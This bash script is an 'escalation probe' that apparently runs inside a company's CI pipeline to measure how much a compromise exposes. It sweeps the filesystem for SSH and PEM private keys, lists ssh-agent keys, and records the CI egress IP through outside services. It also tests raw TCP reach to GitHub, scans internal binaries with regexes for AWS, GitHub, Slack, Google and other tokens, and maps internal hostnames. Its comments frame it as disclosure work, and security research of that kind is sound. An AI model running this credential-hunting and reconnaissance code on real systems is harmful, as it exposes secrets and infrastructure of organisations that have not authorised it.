#!/usr/bin/env bash
# ESCALATION probe. Local reads + one plain outbound GET. No Yext credential used.
# Goals: (a) is key MATERIAL extractable (permanent vs build-window compromise)
#        (b) what EGRESS IP does CI use (lets Yext audit GitHub logs for it)
#        (c) any OTHER credentials in the readable first-party binaries
set +e
B="YEXTESC"; echo "$B-BEGIN"

echo "$B-KEYFILES-START"
echo "-- private key FILES anywhere readable (id_*, *.pem, *.key, deps_key) --"
find / -maxdepth 8 \( -path /proc -o -path /sys \) -prune -o \
  -type f \( -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' -o -name '*.pem' \
             -o -name '*.key' -o -name 'deps_key*' \) -print 2>/dev/null | head -25
echo "-- grep for PRIVATE KEY headers in readable files under /opt /scripts /home /root /tmp --"
grep -rlsa -- '-----BEGIN .*PRIVATE KEY-----' /opt /scripts /home /root /tmp 2>/dev/null | head -15
echo "-- agent export attempt (MUST fail; ssh-agent has no export op) --"
ssh-add -L > /dev/null 2>&1 && echo "pubkey listable=YES(expected)"
echo "$B-KEYFILES-END"

echo "$B-EGRESS-START"
echo "-- CI egress IP (give Yext this to grep their GitHub audit log) --"
curl -s --max-time 12 https://api.ipify.org 2>&1; echo
curl -s --max-time 12 https://ifconfig.me/all 2>&1 | head -8
echo "-- can we reach github.com:22 at all (TCP only) --"
timeout 8 bash -c 'cat < /dev/null > /dev/tcp/github.com/22' 2>&1 && echo "github:22 reachable=YES"
echo "$B-EGRESS-END"

echo "$B-BINSECRETS-START"
BINS="/scripts/bin/cbdservice /scripts/bin/artifactbundler"
ls -la $BINS 2>&1
echo "-- high-confidence token formats --"
strings -n 12 $BINS 2>/dev/null \
 | grep -aoE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36,}|ghs_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{40,}|xox[baprs]-[A-Za-z0-9-]{10,}|AIza[0-9A-Za-z_-]{35}|glpat-[A-Za-z0-9_-]{20}|SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}' \
 | sort -u | head -25
echo "-- embedded private keys in binaries --"
strings -n 20 $BINS 2>/dev/null | grep -aoE -- '-----BEGIN [A-Z ]*PRIVATE KEY-----' | sort | uniq -c
echo "-- internal hostnames (service topology) --"
strings -n 8 $BINS 2>/dev/null | grep -aoE '[a-z0-9.-]+\.(yext|yextapis|devops-[a-z0-9]+)\.(com|net|io)' | sort -u | head -25
echo "$B-BINSECRETS-END"

echo "$B-END"; exit 0
